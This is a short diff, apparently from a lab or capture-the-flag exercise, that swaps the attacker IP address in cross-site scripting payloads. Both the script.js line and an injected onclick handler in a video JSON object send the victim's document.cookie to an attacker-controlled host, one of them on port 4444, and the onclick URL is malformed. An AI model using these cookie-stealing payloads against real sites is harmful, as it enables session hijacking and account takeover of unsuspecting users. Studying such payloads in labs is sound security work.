@@ -1,6 +1,6 @@
 ----------------------------
 script.js
-new Image().src='http://10.10.14.3/index.php?c='+document.cookie
+new Image().src='http://10.10.10.10/index.php?c='+document.cookie
 
 
 index.php
@@ -25,7 +25,7 @@ if (isset($_GET['c'])) {
     "url": "<link of a video>",
     "videoType": "hosted",
     "videoParams": {
-        "onclick":"this.src='//http://10.10.14.3:4444>'+document.cookie;",
+        "onclick":"this.src='//http://10.10.10.10:4444>'+document.cookie;",
         "style": "background-color:black"
     }
 }
